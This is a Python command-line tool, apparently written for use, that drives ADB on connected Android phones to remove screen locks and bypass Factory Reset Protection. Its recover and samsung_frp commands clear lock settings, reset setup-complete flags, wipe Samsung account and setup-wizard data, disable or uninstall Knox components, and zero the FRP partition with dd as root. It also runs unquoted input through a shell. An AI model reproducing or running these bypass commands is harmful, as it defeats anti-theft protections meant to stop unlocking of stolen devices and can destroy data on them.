# cli/smart_recovery_cli.py
"""
Smart Recovery CLI - Command Line Interface
Complete tool with all recovery methods and scrcpy integration
"""

import asyncio
import click
import json
import os
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress
import subprocess
import sys
from typing import Optional

console = Console()

class SmartRecoveryCLI:
    """Complete CLI tool for Android recovery"""
    
    def __init__(self):
        self.current_device = None
        self.config_file = os.path.expanduser("~/.smart_recovery_config.json")
        self.load_config()
    
    def load_config(self):
        """Load configuration from file"""
        try:
            with open(self.config_file) as f:
                self.config = json.load(f)
        except:
            self.config = {
                "api_url": "http://localhost:8000",
                "token": None,
                "favorite_devices": [],
                "history": []
            }
    
    def save_config(self):
        """Save configuration to file"""
        with open(self.config_file, 'w') as f:
            json.dump(self.config, f, indent=2)
    
    def run_adb(self, command: str) -> str:
        """Execute ADB command"""
        try:
            result = subprocess.run(
                f"adb {command}",
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            return result.stdout.strip()
        except Exception as e:
            return f"ERROR: {e}"

@click.group()
@click.pass_context
def cli(ctx):
    """Smart Recovery CLI - Android Recovery & FRP Bypass Tool"""
    ctx.obj = SmartRecoveryCLI()

@cli.command()
@click.pass_obj
def devices(app):
    """List connected devices"""
    devices_list = app.run_adb("devices -l").splitlines()
    
    table = Table(title="Connected Devices")
    table.add_column("Serial", style="cyan")
    table.add_column("Model", style="green")
    table.add_column("Android", style="yellow")
    table.add_column("Status", style="magenta")
    
    for line in devices_list[1:]:
        if line.strip():
            parts = line.split()
            if len(parts) >= 2:
                serial = parts[0]
                # Get more info
                model = app.run_adb(f"-s {serial} shell getprop ro.product.model")
                android = app.run_adb(f"-s {serial} shell getprop ro.build.version.release")
                
                table.add_row(serial, model, android, parts[-1])
    
    console.print(table)

@cli.command()
@click.argument('serial')
@click.pass_obj
def info(app, serial):
    """Get detailed device information"""
    with Progress() as progress:
        task = progress.add_task("[cyan]Gathering device info...", total=None)
        
        info = {
            "Manufacturer": app.run_adb(f"-s {serial} shell getprop ro.product.manufacturer"),
            "Model": app.run_adb(f"-s {serial} shell getprop ro.product.model"),
            "Android": app.run_adb(f"-s {serial} shell getprop ro.build.version.release"),
            "SDK": app.run_adb(f"-s {serial} shell getprop ro.build.version.sdk"),
            "Chipset": app.run_adb(f"-s {serial} shell getprop ro.hardware.chipname"),
            "Security Patch": app.run_adb(f"-s {serial} shell getprop ro.build.version.security_patch"),
            "Build": app.run_adb(f"-s {serial} shell getprop ro.build.fingerprint"),
        }
        
        # Check root
        root_check = app.run_adb(f"-s {serial} shell whoami")
        info["Root"] = "Yes" if root_check.strip() == "root" else "No"
        
        # Check FRP
        frp_check = app.run_adb(f"-s {serial} shell content query --uri content://settings/secure --projection value --where \"name='user_setup_complete'\"")
        info["FRP Status"] = "Active" if "value=1" in frp_check else "Pending" if "value=0" in frp_check else "Unknown"
        
        progress.update(task, completed=100)
    
    table = Table(title=f"Device Info: {serial}")
    table.add_column("Property", style="cyan")
    table.add_column("Value", style="green")
    
    for key, value in info.items():
        table.add_row(key, value)
    
    console.print(table)

@cli.command()
@click.argument('serial')
@click.option('--method', '-m', default='auto', help='Recovery method')
@click.option('--type', '-t', 'recovery_type', default='auto', 
              type=click.Choice(['auto', 'screen_lock', 'frp_bypass', 'full_recovery']))
@click.pass_obj
def recover(app, serial, method, recovery_type):
    """Start recovery process"""
    console.print(Panel(f"[bold green]Starting Recovery on {serial}[/bold green]"))
    
    # Detect Exynos
    cpu_info = app.run_adb(f"-s {serial} shell cat /proc/cpuinfo")
    is_exynos = "exynos" in cpu_info.lower()
    
    if is_exynos:
        console.print("[yellow]⚡ Samsung Exynos device detected![/yellow]")
        console.print("[yellow]Using specialized Exynos methods...[/yellow]")
    
    methods_used = []
    
    with Progress() as progress:
        if recovery_type in ['auto', 'screen_lock']:
            task1 = progress.add_task("[cyan]Removing screen lock...", total=None)
            
            # Try lock removal
            commands = [
                f"shell locksettings clear",
                f"shell settings put secure lock_pattern_autolock 0",
                f"shell settings put secure lockscreen.disabled 1",
            ]
            
            for cmd in commands:
                result = app.run_adb(f"-s {serial} {cmd}")
                methods_used.append({"command": cmd, "result": result})
            
            progress.update(task1, completed=100)
        
        if recovery_type in ['auto', 'frp_bypass']:
            task2 = progress.add_task("[cyan]Bypassing FRP...", total=None)
            
            if is_exynos:
                # Exynos-specific FRP bypass
                exynos_commands = [
                    f"shell settings put global device_provisioned 0",
                    f"shell settings put secure user_setup_complete 0",
                    f"shell pm clear com.samsung.android.samsungaccount",
                    f"shell pm clear com.google.android.setupwizard",
                    f"shell pm disable-user --user 0 com.samsung.android.knox.attestation",
                ]
                
                for cmd in exynos_commands:
                    result = app.run_adb(f"-s {serial} {cmd}")
                    methods_used.append({"command": cmd, "result": result})
            else:
                # Standard FRP bypass
                standard_commands = [
                    f"shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1",
                    f"shell am start -n com.google.android.gsf.login/",
                ]
                
                for cmd in standard_commands:
                    result = app.run_adb(f"-s {serial} {cmd}")
                    methods_used.append({"command": cmd, "result": result})
            
            progress.update(task2, completed=100)
    
    # Display results
    console.print("\n[bold green]Recovery Complete![/bold green]")
    console.print(f"Methods used: {len(methods_used)}")
    
    for method in methods_used:
        status = "[green]✓[/green]" if "Error" not in method['result'] else "[red]✗[/red]"
        console.print(f"{status} {method['command'][:50]}...")
    
    # Ask to reboot
    if Confirm.ask("\nReboot device to apply changes?"):
        app.run_adb(f"-s {serial} reboot")
        console.print("[green]Rebooting...[/green]")

@cli.command()
@click.argument('serial')
@click.option('--quality', '-q', default='medium', type=click.Choice(['low', 'medium', 'high']))
@click.option('--bitrate', '-b', default='2M')
@click.pass_obj
def scrcpy(app, serial, quality, bitrate):
    """Start scrcpy session for remote control"""
    console.print(f"[cyan]Starting scrcpy for {serial}...[/cyan]")
    
    # Kill existing instances
    subprocess.run("pkill scrcpy", shell=True, capture_output=True)
    
    quality_presets = {
        'low': '--max-size=800 --bit-rate=1M',
        'medium': '--max-size=1024 --bit-rate=2M',
        'high': '--max-size=1920 --bit-rate=8M'
    }
    
    # Start scrcpy
    cmd = f"scrcpy -s {serial} {quality_presets[quality]} --stay-awake --window-title='Smart Recovery - {serial}'"
    
    console.print(f"[dim]Running: scrcpy -s {serial} ...[/dim]")
    subprocess.Popen(cmd, shell=True)
    
    console.print("[green]scrcpy started! Control the device from your desktop.[/green]")

@cli.command()
@click.argument('serial')
@click.option('--type', '-t', 'backup_type', default='full',
              type=click.Choice(['full', 'settings', 'frp']))
@click.pass_obj
def backup(app, serial, backup_type):
    """Create device backup"""
    timestamp = __import__('datetime').datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_dir = f"backup_{serial}_{timestamp}"
    os.makedirs(backup_dir, exist_ok=True)
    
    console.print(f"[cyan]Creating backup in {backup_dir}/[/cyan]")
    
    with Progress() as progress:
        task = progress.add_task("[cyan]Backing up...", total=None)
        
        if backup_type in ['full', 'settings']:
            # Backup settings
            settings_files = [
                "/data/system/users/0/settings_global.xml",
                "/data/system/users/0/settings_secure.xml",
                "/data/system/users/0/settings_system.xml",
            ]
            
            for file in settings_files:
                app.run_adb(f"-s {serial} pull {file} {backup_dir}/")
        
        if backup_type in ['full', 'frp']:
            # Backup FRP partition
            app.run_adb(f"-s {serial} shell su -c 'dd if=/dev/block/bootdevice/by-name/frp of=/sdcard/frp_backup.img'")
            app.run_adb(f"-s {serial} pull /sdcard/frp_backup.img {backup_dir}/")
            app.run_adb(f"-s {serial} shell rm /sdcard/frp_backup.img")
        
        progress.update(task, completed=100)
    
    console.print(f"[green]✓ Backup saved to {backup_dir}/[/green]")

@cli.command()
@click.argument('serial')
@click.option('--duration', '-d', default=60, help='Recording duration in seconds')
@click.pass_obj
def record(app, serial, duration):
    """Record device screen"""
    console.print(f"[cyan]Recording {serial} for {duration} seconds...[/cyan]")
    
    timestamp = __import__('datetime').datetime.now().strftime("%Y%m%d_%H%M%S")
    output_file = f"recording_{serial}_{timestamp}.mp4"
    
    # Start recording
    app.run_adb(f"-s {serial} shell screenrecord --time-limit {duration} /sdcard/recording.mp4")
    
    __import__('time').sleep(duration + 2)
    
    # Pull recording
    app.run_adb(f"-s {serial} pull /sdcard/recording.mp4 {output_file}")
    app.run_adb(f"-s {serial} shell rm /sdcard/recording.mp4")
    
    console.print(f"[green]✓ Recording saved: {output_file}[/green]")

@cli.command()
@click.argument('serial')
@click.argument('file_path')
@click.argument('destination', default='/sdcard/')
@click.pass_obj
def push(app, serial, file_path, destination):
    """Push file to device"""
    result = app.run_adb(f"-s {serial} push {file_path} {destination}")
    console.print(result)

@cli.command()
@click.argument('serial')
@click.argument('remote_path')
@click.argument('local_path', default='./')
@click.pass_obj
def pull(app, serial, remote_path, local_path):
    """Pull file from device"""
    result = app.run_adb(f"-s {serial} pull {remote_path} {local_path}")
    console.print(result)

@cli.command()
@click.argument('serial')
@click.pass_obj
def shell(app, serial):
    """Open interactive ADB shell"""
    console.print(f"[cyan]Opening shell on {serial}...[/cyan]")
    os.system(f"adb -s {serial} shell")

@cli.command()
@click.option('--method', '-m', default='all', help='FRP method to test')
@click.argument('serial')
@click.pass_obj
def samsung_frp(app, serial, method):
    """Samsung-specific FRP bypass methods"""
    console.print("[cyan]Samsung FRP Bypass[/cyan]")
    
    # Detect model
    model = app.run_adb(f"-s {serial} shell getprop ro.product.model")
    console.print(f"Model: {model}")
    
    exynos_model = 0
    cpu_info = app.run_adb(f"-s {serial} shell cat /proc/cpuinfo")
    if "exynos" in cpu_info.lower():
        import re
        match = re.search(r'exynos(\d+)', cpu_info.lower())
        if match:
            exynos_model = int(match.group(1))
            console.print(f"[yellow]Exynos {exynos_model} detected[/yellow]")
    
    methods = []
    
    if exynos_model >= 9810:
        methods = [
            ("Combination Firmware Method", [
                "shell settings put global device_provisioned 0",
                "shell settings put secure user_setup_complete 0",
                "shell pm clear com.samsung.android.samsungaccount",
                "shell pm clear com.google.android.setupwizard",
                "shell pm disable-user --user 0 com.samsung.android.knox.attestation",
                "shell pm disable-user --user 0 com.samsung.android.kgclient",
            ]),
            ("DeKnox Method", [
                "shell pm uninstall --user 0 com.samsung.android.knox.containercore",
                "shell pm uninstall --user 0 com.samsung.knox.securefolder",
                "shell rm -rf /data/data/com.samsung.android.knox.*",
            ]),
        ]
    elif exynos_model > 0:
        methods = [
            ("Download Mode Exploit", [
                "shell su -c 'dd if=/dev/zero of=/dev/block/platform/15570000.ufs/by-name/FRP bs=512 count=1'",
                "shell su -c 'dd if=/dev/zero of=/dev/block/platform/15560000.dwmmc0/by-name/FRP bs=512 count=1'",
            ]),
            ("Settings Reset", [
                "shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1",
                "shell am start -n com.android.settings/.Settings",
            ]),
        ]
    else:
        methods = [
            ("Standard Samsung Bypass", [
                "shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1",
                "shell am start -n com.google.android.gsf.login/",
            ]),
        ]
    
    for method_name, commands in methods:
        console.print(f"\n[bold cyan]Trying: {method_name}[/bold cyan]")
        
        for cmd in commands:
            result = app.run_adb(f"-s {serial} {cmd}")
            if "error" in result.lower():
                console.print(f"  [red]✗[/red] {cmd}")
            else:
                console.print(f"  [green]✓[/green] {cmd}")

if __name__ == "__main__":
    cli()
